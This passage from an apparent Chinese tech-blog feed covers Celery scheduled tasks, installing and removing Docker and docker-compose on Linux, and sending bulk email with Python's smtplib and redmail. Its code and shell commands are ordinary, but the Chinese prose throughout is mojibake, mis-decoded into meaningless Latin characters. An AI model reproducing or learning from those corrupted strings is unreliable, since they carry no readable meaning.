<h2 id="å®šæ—¶ä»»åŠ¡"><a href="#å®šæ—¶ä»»åŠ¡" class="headerlink" title="å®šæ—¶ä»»åŠ¡"></a>å®šæ—¶ä»»åŠ¡</h2><blockquote>
<p>crontab docs -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmNlbGVyeXEuZGV2L2VuL3N0YWJsZS9yZWZlcmVuY2UvY2VsZXJ5LnNjaGVkdWxlcy5odG1s">https://docs.celeryq.dev/en/stable/reference/celery.schedules.html</span></p>
</blockquote>
<h3 id="é…ç½®æ—¶åŒº"><a href="#é…ç½®æ—¶åŒº" class="headerlink" title="é…ç½®æ—¶åŒº"></a>é…ç½®æ—¶åŒº</h3><p><strong>timezone</strong>: é»˜è®¤ä¸ºUTC(version&gt;3.0)<br>å€¼ä¸º<code>pytz</code>åº“æ”¯æŒçš„æ—¶åŒº -&gt; <code>pytz.common_timezones</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.conf.timezone = <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>enable_utc</strong>: è®¾ç½®ä¸º false æ—¶ï¼Œå°†ä½¿ç”¨ç³»ç»Ÿæœ¬åœ°æ—¶åŒº.</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">app.conf.enable_utc</span> = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h3 id="Dome"><a href="#Dome" class="headerlink" title="Dome"></a>Dome</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery  <span class="comment"># pip install -U Celery</span></span><br><span class="line"><span class="keyword">from</span> celery.schedules <span class="keyword">import</span> crontab</span><br><span class="line"></span><br><span class="line">broker = <span class="string">&#x27;redis://localhost:6379/2&#x27;</span></span><br><span class="line">backend = <span class="string">&#x27;redis://localhost:6379/3&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Celery(<span class="string">&#x27;dome&#x27;</span>, broker=broker, backend=backend, result_expires=<span class="number">120</span>)</span><br><span class="line"></span><br><span class="line">app.conf.timezone = <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line">app.conf.beat_schedule = &#123;</span><br><span class="line">    <span class="string">&#x27;add_schedule&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;dome.add&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;schedule&#x27;</span>: <span class="number">3.0</span>,	<span class="comment"># æ¯3ç§’æ‰§è¡Œä¸€æ¬¡</span></span><br><span class="line">        <span class="string">&#x27;args&#x27;</span>: (<span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;wait_schedule&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;dome.wait&#x27;</span>,		<span class="comment"># æ³¨æ„æ¨¡å—åè¦ä¸€è‡´</span></span><br><span class="line">        <span class="string">&#x27;schedule&#x27;</span>: crontab(),  	<span class="comment"># æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</span></span><br><span class="line">        <span class="string">&#x27;args&#x27;</span>: (randint(<span class="number">2</span>,<span class="number">20</span>),)	<span class="comment"># æ³¨æ„å‚æ•°æ˜¯å…ƒç»„</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">wait</span>):</span><br><span class="line">    time.sleep(wait)</span><br><span class="line">    <span class="keyword">return</span> wait</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure>

<h3 id="è¿è¡Œcelery"><a href="#è¿è¡Œcelery" class="headerlink" title="è¿è¡Œcelery"></a>è¿è¡Œcelery</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">celery</span> -A dome worker -l <span class="literal">info</span></span><br></pre></td></tr></table></figure>

<p>åŠ ä¸Š <code>-B</code> ä¼šåŒæ—¶å¯åŠ¨ å®šæ—¶ä»»åŠ¡</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">celery -<span class="selector-tag">A</span> dome worker -l info -<span class="selector-tag">B</span></span><br></pre></td></tr></table></figure>

<h3 id="å¯åŠ¨å®šæ—¶ä»»åŠ¡"><a href="#å¯åŠ¨å®šæ—¶ä»»åŠ¡" class="headerlink" title="å¯åŠ¨å®šæ—¶ä»»åŠ¡"></a>å¯åŠ¨å®šæ—¶ä»»åŠ¡</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">celery</span> -A dome beat -l <span class="literal">info</span></span><br></pre></td></tr></table></figure>

<h2 id="ä½¿ç”¨é…ç½®æ–‡ä»¶"><a href="#ä½¿ç”¨é…ç½®æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨é…ç½®æ–‡ä»¶"></a>ä½¿ç”¨é…ç½®æ–‡ä»¶</h2><p>åˆ›å»º<code>config</code>æ–‡ä»¶å¤¹, ç„¶ååˆ›å»º <code>celery.py</code>å’Œ<code>__init__.py</code>æ–‡ä»¶</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ <span class="keyword">conf</span></span><br><span class="line">â”‚   â”œâ”€â”€ celery.<span class="keyword">py</span></span><br><span class="line">â”‚   â””â”€â”€ __init__.<span class="keyword">py</span></span><br><span class="line">â”œâ”€â”€ dome.<span class="keyword">py</span></span><br><span class="line">â””â”€â”€ test.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹<code>celery.py</code>, æŠŠå‰é¢çš„é…ç½®è½¬ç§»è¿›æ¥</p>
<blockquote>
<p>é…ç½®æ–‡æ¡£ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmNlbGVyeXEuZGV2L2VuL3N0YWJsZS91c2VyZ3VpZGUvY29uZmlndXJhdGlvbi5odG1s">https://docs.celeryq.dev/en/stable/userguide/configuration.html</span></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> celery.schedules <span class="keyword">import</span> crontab</span><br><span class="line"></span><br><span class="line">broker_url = <span class="string">&#x27;redis://localhost:6379/2&#x27;</span></span><br><span class="line">result_backend = <span class="string">&#x27;redis://localhost:6379/3&#x27;</span></span><br><span class="line"></span><br><span class="line">result_expires = <span class="number">120</span>    <span class="comment"># ç»“æœå­˜å‚¨æ—¶é—´</span></span><br><span class="line"></span><br><span class="line">retry_policy = <span class="number">5.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Workeræ¥æ”¶è¶…æ—¶, è¶…æ—¶æ²¡æœ‰ç¡®è®¤æ—¶ä»»åŠ¡ä¼šè¢«åˆ†é…åˆ°å¦ä¸€ä¸ªWorker</span></span><br><span class="line">broker_transport_options = &#123;<span class="string">&#x27;visibility_timeout&#x27;</span>: <span class="number">600</span>&#125;</span><br><span class="line"></span><br><span class="line">timezone = <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line">beat_schedule = &#123;</span><br><span class="line">    <span class="string">&#x27;add_schedule&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;dome.add&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;schedule&#x27;</span>: <span class="number">3.0</span>,	<span class="comment"># æ¯3ç§’æ‰§è¡Œä¸€æ¬¡</span></span><br><span class="line">        <span class="string">&#x27;args&#x27;</span>: (<span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;wait_schedule&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;dome.wait&#x27;</span>,		<span class="comment"># æ³¨æ„æ¨¡å—åè¦ä¸€è‡´</span></span><br><span class="line">        <span class="string">&#x27;schedule&#x27;</span>: crontab(),  	<span class="comment"># æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</span></span><br><span class="line">        <span class="string">&#x27;args&#x27;</span>: (randint(<span class="number">2</span>,<span class="number">20</span>),)	<span class="comment"># æ³¨æ„å‚æ•°æ˜¯å…ƒç»„</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹<code>dome.py</code>, ä½¿ç”¨ <code>config_from_object()</code> åŠ è½½é…ç½®æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"></span><br><span class="line">app = Celery(<span class="string">&#x27;dome&#x27;</span>)</span><br><span class="line">app.config_from_object(<span class="string">&#x27;conf.celery&#x27;</span>)  <span class="comment"># å¯¼å…¥é…ç½®</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">wait</span>):</span><br><span class="line">    time.sleep(wait)</span><br><span class="line">    <span class="keyword">return</span> wait</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure>

<h2 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h2><ul>
<li><p>æŸ¥çœ‹ Workers çŠ¶æ€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">celery -A &lt;workers&gt; inspect active</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Celery</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux å®‰è£… Docker</title>
    <url>/bcd27009/</url>
    <content><![CDATA[<h2 id="Ubuntu-x2F-Debian"><a href="#Ubuntu-x2F-Debian" class="headerlink" title="Ubuntu&#x2F;Debian"></a>Ubuntu&#x2F;Debian</h2><blockquote>
<p>é€‚ç”¨äº Ubuntu 21.04ã€21.10å’Œ Debian å‘è¡Œç‰ˆ</p>
<p>å®˜æ–¹æ–‡æ¡£: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZGVza3RvcC9saW51eC8=">https://docs.docker.com/desktop/linux/</span></p>
</blockquote>
<h3 id="æ·»åŠ é•œåƒæº"><a href="#æ·»åŠ é•œåƒæº" class="headerlink" title="æ·»åŠ é•œåƒæº"></a>æ·»åŠ é•œåƒæº</h3><p>å®‰è£…ç›¸å…³åŒ…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; \</span><br><span class="line">sudo apt-get install \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ å®˜æ–¹ GPG å¯†é’¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®é•œåƒæº</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=<span class="subst">$(dpkg --print-architecture)</span> signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<h3 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h3><p>è¿è¡Œ<code>hello-world</code>é•œåƒæŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>

<h3 id="å¸è½½"><a href="#å¸è½½" class="headerlink" title="å¸è½½"></a>å¸è½½</h3><p>å¸è½½ç›¸å…³åŒ…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt remove docker-desktop</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤æ‰€æœ‰é•œåƒ, å®¹å™¨, å·</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -r <span class="variable">$HOME</span>/.docker/desktop</span><br><span class="line">sudo <span class="built_in">rm</span> /usr/local/bin/com.docker.cli</span><br><span class="line">sudo apt purge docker-desktop</span><br></pre></td></tr></table></figure>



<h2 id="CentOS7-x2F-8"><a href="#CentOS7-x2F-8" class="headerlink" title="CentOS7&#x2F;8"></a>CentOS7&#x2F;8</h2><blockquote>
<p>é€‚ç”¨äº CentOS7&#x2F;8</p>
<p>å®˜æ–¹æ–‡æ¡£: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL2luc3RhbGwvY2VudG9zLw==">https://docs.docker.com/engine/install/centos/</span></p>
</blockquote>
<h3 id="æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒ"><a href="#æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒ" class="headerlink" title="æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒ"></a>æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/redhat-release</span><br></pre></td></tr></table></figure>

<h3 id="æ·»åŠ é•œåƒæº-1"><a href="#æ·»åŠ é•œåƒæº-1" class="headerlink" title="æ·»åŠ é•œåƒæº"></a>æ·»åŠ é•œåƒæº</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils <span class="comment"># yumå‘½ä»¤å¢å¼ºå·¥å…·</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®æ‰€å¤„ç½‘ç»œé€‰å…¶ä¸€å³å¯</span></span><br><span class="line"><span class="comment"># å®˜æ–¹æº</span></span><br><span class="line">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line"><span class="comment"># é˜¿é‡Œæº</span></span><br><span class="line">sudo yum-config-manager --add-repo  http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…-1"><a href="#å®‰è£…-1" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å®‰è£…è¿‡ç¨‹ä¸­æç¤º&quot;æ¥å— GPG å¯†é’¥&quot;çš„è¯ï¼ŒéªŒè¯æŒ‡çº¹æ˜¯å¦ä¸<code>060a 61c51b558a7f 742B 77AA C52F EB6B 621E 9f35</code>åŒ¹é…ï¼Œå¦‚æœæ˜¯ï¼Œæ¥å—å®ƒ.</p>
</blockquote>
<h3 id="å¯åŠ¨"><a href="#å¯åŠ¨" class="headerlink" title="å¯åŠ¨"></a>å¯åŠ¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure>

<h3 id="éªŒè¯-1"><a href="#éªŒè¯-1" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h3><p>è¿è¡Œ<code>hello-world</code>é•œåƒæŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>

<h3 id="å¸è½½-1"><a href="#å¸è½½-1" class="headerlink" title="å¸è½½"></a>å¸è½½</h3><p>å¸è½½ç›¸å…³åŒ…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤æ‰€æœ‰é•œåƒ, å®¹å™¨, å·</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> -rf /var/lib/docker</span><br><span class="line">sudo <span class="built_in">rm</span> -rf /var/lib/containerd</span><br></pre></td></tr></table></figure>

<h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h2><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvY2tlci9jb21wb3Nl">docker&#x2F;compose: Define and run multi-container applications with Docker (github.com)</span></p>
</blockquote>
<h3 id="å®‰è£…-2"><a href="#å®‰è£…-2" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å®‰è£…çš„æ˜¯2.5.0ç‰ˆæœ¬, æ–°ç‰ˆå¯ä»¥å»é¡¹ç›®ä»“åº“è·å–.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/v2.5.0/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h3 id="èµ‹æƒ"><a href="#èµ‹æƒ" class="headerlink" title="èµ‹æƒ"></a>èµ‹æƒ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h3 id="é“¾æ¥åˆ°PATH"><a href="#é“¾æ¥åˆ°PATH" class="headerlink" title="é“¾æ¥åˆ°PATH"></a>é“¾æ¥åˆ°PATH</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h3 id="å¸è½½-2"><a href="#å¸è½½-2" class="headerlink" title="å¸è½½"></a>å¸è½½</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Linux</tag>
        <tag>CentOS</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Python ä¼˜é›…çš„ç¾¤å‘é‚®ä»¶</title>
    <url>/9f9b4f64/</url>
    <content><![CDATA[<h2 id="å‰ç½®æ¡ä»¶"><a href="#å‰ç½®æ¡ä»¶" class="headerlink" title="å‰ç½®æ¡ä»¶"></a>å‰ç½®æ¡ä»¶</h2><blockquote>
<p>é‚®ç®±éœ€è¦å¼€å¯<strong>SMTPåŠŸèƒ½</strong></p>
</blockquote>
<h3 id="ç®€å•äº†è§£"><a href="#ç®€å•äº†è§£" class="headerlink" title="ç®€å•äº†è§£"></a>ç®€å•äº†è§£</h3><ul>
<li><p><strong>SMTP</strong>(Simple Mail Transfer Protocol)<br>ç®€å•é‚®ä»¶ä¼ è¾“åè®®, æ˜¯ç”µå­é‚®ä»¶å‘é€çš„è¡Œä¸šæ ‡å‡†åè®®.(å‘é€ç”¨)</p>
</li>
<li><p><strong>IMAP</strong>(Internet Access Message Protocol)<br>å¤„ç†ä»æ¥æ”¶æœåŠ¡å™¨ç®¡ç†å’Œæ£€ç´¢ç”µå­é‚®ä»¶æ¶ˆæ¯çš„ç”µå­é‚®ä»¶åè®®.ï¼ˆæ¥å—ç”¨)<br><strong>å¯ä»¥è·¨æ‰€æœ‰è®¾å¤‡åŒæ­¥æ¶ˆæ¯</strong>.</p>
</li>
<li><p><strong>POP3</strong><br>POP(é‚®å±€åè®®), 3(ç‰ˆæœ¬å·), ä¹Ÿæ˜¯æ¥å—ç”¨çš„åè®®.<br>å’Œ<code>IMAP</code>ä¸»è¦åŒºåˆ«åœ¨, <code>POP3</code>ä¼šä¿å­˜æ–‡ä»¶åˆ°æœ¬åœ°, æœåŠ¡å™¨åˆ äº†ä¹Ÿæ²¡äº‹, ä¾¿äºè„±æœº.</p>
</li>
</ul>
<h3 id="å¼€å¯SMTP"><a href="#å¼€å¯SMTP" class="headerlink" title="å¼€å¯SMTP"></a>å¼€å¯SMTP</h3><p>ä»¥ <strong>outlook</strong> é‚®ç®±ä¸ºä¾‹:</p>
<ul>
<li><p>ç™»å½•ç½‘é¡µç‰ˆé‚®ç®± -&gt; <span class="exturl" data-url="aHR0cHM6Ly9vdXRsb29rLmNvbS8=">https://outlook.com</span></p>
</li>
<li><p>å³ä¸Šè§’æ‰“å¼€<code>è®¾ç½®</code>-æœç´¢<code>IMAP</code>-æ‰“å¼€<code>POPå’ŒIMAP</code>è®¾ç½®</p>
<p><img data-src="http://img.owq.world/2022/04/2141-ca5732.png"></p>
</li>
<li><p>é»˜è®¤æ˜¯å¼€å¯<code>SMTP </code>æœåŠ¡çš„<br><img data-src="http://img.owq.world/2022/05/2055-d813fd.png"></p>
</li>
<li><p>è®°å½•ä¸‹ <code>SMTP</code> é…ç½®</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">æœåŠ¡å™¨åç§°: smtp.office365.com</span></span><br><span class="line"><span class="section">ç«¯å£: 587</span></span><br><span class="line"><span class="section">åŠ å¯†æ–¹æ³•: STARTTLS</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><em>æ³¨: å…¶å®ƒç±»å‹çš„é‚®ç®±å¤§å¤šéœ€è¦è·å–<strong>æˆæƒç </strong>æ‰èƒ½ç™»å½•é‚®ç®±, è€Œ<code>outlook</code>ç”¨è´¦å·å¯†ç å°±å¯ä»¥.</em></p>
<h2 id="ç®€å•å®ç°"><a href="#ç®€å•å®ç°" class="headerlink" title="ç®€å•å®ç°"></a>ç®€å•å®ç°</h2><p>å…ˆä»‹ç»è¦ç”¨åˆ°çš„åº“</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy9saWJyYXJ5L3NtdHBsaWIuaHRtbA==">smtplib</span><br>å®šä¹‰äº†SMTPå®¢æˆ·ç«¯çš„ä½¿ç”¨</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy9saWJyYXJ5L2VtYWlsLmV4YW1wbGVzLmh0bWw=">email</span><br>é‚®ä»¶çš„ç¼–å†™å’Œç®€å•å‘é€</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.message <span class="keyword">import</span> EmailMessage</span><br><span class="line"></span><br><span class="line">msg = EmailMessage()</span><br><span class="line">msg[<span class="string">&#x27;From&#x27;</span>] = <span class="string">&#x27;me@outlook.com&#x27;</span>    <span class="comment"># å‘é€é‚®ç®±</span></span><br><span class="line">msg[<span class="string">&#x27;To&#x27;</span>] = [<span class="string">&#x27;example@outlook.com&#x27;</span>, <span class="string">&#x27;example@qq.com&#x27;</span>]   <span class="comment"># æ¥å—é‚®ç®±</span></span><br><span class="line">password = <span class="string">&#x27;*****&#x27;</span></span><br><span class="line"></span><br><span class="line">msg[<span class="string">&#x27;Subject&#x27;</span>] = <span class="string">&#x27;This is a test email&#x27;</span>	<span class="comment"># é‚®ä»¶æ ‡é¢˜</span></span><br><span class="line">msg.set_content(<span class="string">&#x27;Hello !&#x27;</span>)		<span class="comment"># é‚®ä»¶å†…å®¹</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> smtplib.SMTP(<span class="string">&#x27;smtp.office365.com&#x27;</span>, port=<span class="number">587</span>) <span class="keyword">as</span> smtp:</span><br><span class="line">    smtp.starttls()                     <span class="comment"># è®¾ç½®è¿æ¥æ¨¡å¼ä¸ºTLS</span></span><br><span class="line">    smtp.login(msg[<span class="string">&#x27;From&#x27;</span>], password)   <span class="comment"># ç™»å½•å®¢æˆ·ç«¯</span></span><br><span class="line">    smtp.send_message(msg)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å¦ä¸€ç§å‘é€æ–¹å¼</span></span><br><span class="line">    <span class="comment"># smtp.sendmail(from_addr=f&quot;owq&lt;&#123;msg[&#x27;From&#x27;]&#125;&gt;&quot;, to_addrs=msg[&#x27;To&#x27;], msg=msg.as_string())</span></span><br></pre></td></tr></table></figure>

<p>å½“å‡ºç°æ›´å¤æ‚çš„éœ€æ±‚å‡ºç°æ—¶, ä¸Šé¢çš„ä»£ç å¾ˆæ˜¾ç„¶ä¸å¤Ÿä¾¿æ·, è¿™æ—¶è¦ä¸å°±è‡ªå·±å°è£…ä¸€ä¸ªåº“, è¦ä¸å°±æ‰¾æ‰¾æœ‰æ²¡æœ‰ç°æˆçš„, è€Œ<code>redmail</code>å°±æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©.</p>
<h2 id="redmail-åº“"><a href="#redmail-åº“" class="headerlink" title="redmail åº“"></a>redmail åº“</h2><blockquote>
<p>ä¸€ä¸ªé«˜çº§é‚®ä»¶å‘é€åº“, å¯ä»¥å¿«é€Ÿç®€æ˜“çš„è¿›è¡Œé‚®ä»¶å‘é€.</p>
</blockquote>
<blockquote>
<p>å®˜æ–¹æ–‡æ¡£ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9yZWQtbWFpbC5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3QvaW5kZXguaHRtbA==">ğŸšª</span></p>
</blockquote>
<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install redmail</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> redmail <span class="keyword">import</span> EmailSender</span><br><span class="line"></span><br><span class="line">email = EmailSender(host=<span class="string">&#x27;smtp.office365.com&#x27;</span>, port=<span class="number">587</span>,</span><br><span class="line">                    username=<span class="string">&#x27;me@outlook.com&#x27;</span>, password=<span class="string">&#x27;*****&#x27;</span>)</span><br><span class="line"></span><br><span class="line">email.send(</span><br><span class="line">    subject=<span class="string">&#x27;This is a test email&#x27;</span>,</span><br><span class="line">    sender=<span class="string">&#x27;me@outlook.com&#x27;</span>,</span><br><span class="line">    receivers=[<span class="string">&#x27;example@outlook.com&#x27;</span>, <span class="string">&#x27;example@qq.com&#x27;</span>],</span><br><span class="line">    text=<span class="string">&#x27;Hello!&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="ä¸€é”®ç¾¤å‘"><a href="#ä¸€é”®ç¾¤å‘" class="headerlink" title="ä¸€é”®ç¾¤å‘"></a>ä¸€é”®ç¾¤å‘</h2><h3 id="å¤§è‡´æµç¨‹"><a href="#å¤§è‡´æµç¨‹" class="headerlink" title="å¤§è‡´æµç¨‹"></a>å¤§è‡´æµç¨‹</h3><p>ç°åœ¨æœ‰è¿™ä¹ˆä¸€ä¸ªéœ€æ±‚:</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">æˆªå›¾åˆ°å‰ªè´´æ¿-&gt;ç²˜è´´åˆ°é‚®ä»¶å®¢æˆ·ç«¯-&gt;å¡«å†™æ”¶ä»¶äºº-&gt;ç‚¹å‡»å‘é€-&gt;å…³é—­å®¢æˆ·ç«¯</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æŠŠå®ƒä¼˜åŒ–æˆè¿™æ ·:</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">æˆªå›¾åˆ°å‰ªè´´æ¿-&gt;å¯åŠ¨è„šæœ¬å®Œæˆç¾¤å‘</span><br></pre></td></tr></table></figure>

<h3 id="æ„å»ºé…ç½®"><a href="#æ„å»ºé…ç½®" class="headerlink" title="æ„å»ºé…ç½®"></a>æ„å»ºé…ç½®</h3><p>å…ˆå®šä¹‰ä¸€ä¸‹é…ç½®æ–‡ä»¶<code>config/email_archive.yml</code>, æœ‰ä¸åŒéœ€æ±‚æ—¶å¯ä»¥é€šè¿‡åˆ‡æ¢é…ç½®æ–‡ä»¶æ¥å¿«é€Ÿåº”ç”¨.</p>
